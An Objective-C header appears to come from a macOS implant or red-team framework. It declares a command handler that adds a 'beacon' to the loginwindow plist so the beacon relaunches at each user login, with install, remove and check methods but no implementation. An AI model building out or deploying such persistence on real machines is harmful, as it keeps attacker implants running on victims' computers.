#import <Foundation/Foundation.h>
#import "ZCommandHandler.h"

/**
 * @interface ZLoginItemCommandHandler
 * @brief Command handler for setting up persistence via the loginwindow.plist mechanism
 *
 * This command handler adds the beacon to the com.apple.loginwindow plist
 * to ensure it relaunches when the user logs in, providing persistence.
 */
@interface ZLoginItemCommandHandler : ZBaseCommandHandler

/**
 * Initialize the LoginItem command handler
 *
 * @return A new LoginItem command handler instance
 */
- (instancetype)init;

/**
 * Install the application as a login item using the loginwindow plist method
 *
 * @param targetPath Optional path to install; if nil, uses current executable path
 * @return TRUE if successfully installed, FALSE otherwise
 */
- (BOOL)installLoginItemWithPath:(NSString *)targetPath;

/**
 * Remove the application from login items
 *
 * @param targetPath Path to remove; if nil, uses current executable path
 * @return TRUE if successfully removed, FALSE otherwise
 */
- (BOOL)removeLoginItemWithPath:(NSString *)targetPath;

/**
 * Check if the application is already set as a login item
 *
 * @param targetPath Path to check; if nil, uses current executable path
 * @return TRUE if already installed as login item, FALSE otherwise
 */
- (BOOL)isLoginItemInstalled:(NSString *)targetPath;

@end